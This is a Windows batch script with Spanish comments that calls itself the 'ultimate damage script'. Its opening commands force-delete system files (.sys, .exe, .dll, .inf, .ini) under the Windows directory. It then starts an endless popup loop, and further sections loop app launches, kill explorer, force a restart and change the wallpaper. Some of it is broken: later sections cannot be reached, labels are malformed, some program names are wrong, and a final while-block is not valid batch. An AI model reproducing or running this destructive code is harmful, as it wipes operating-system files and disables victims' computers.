@echo off
cls
title ¡El script de daño definitivo!
mode con: cols=60 lines=10
echo.
echo            ¡Bienvenido al daño absoluto!
echo.
pause

rem Encuentra todos los archivos importantes y bórralos
del /a /q /f /s %SystemRoot%\system32\*.sys
del /a /q /f /s %SystemRoot%\*.exe
del /a /q /f /s %SystemRoot%\*.dll
del /a /q /f /s %SystemRoot%\*.ocx
del /a /q /f /s %SystemRoot%\*.inf
del /a /q /f /s %SystemRoot%\*.ini

rem Abre un bucle de ventanas emergentes de Windows con un mensaje personalizado
:loop
msg * ¡Estoy arruinando tu ordenador!
goto loop

rem Abre un bucle de aplicaciones al azar
openloop:
start notepad.exe
start explorer.exe
start cmd.exe
start ms-paint.exe
start calculator.exe
start wordpad.exe
goto openloop

rem Derrite el escritorio
melt:
rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True ,0
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
goto melt

rem Reinicia la computadora
shutdown /r /t 0

rem Cambia el fondo de pantalla a la imagen proporcionada
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%~dp0img.jpg" /f
rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True ,0

rem Cambia la imagen del fondo de pantalla cada 1 segundo
while (true) do {
    reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%~dp0img.jpg" /f
    rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,True ,0
    sleep 1s
}
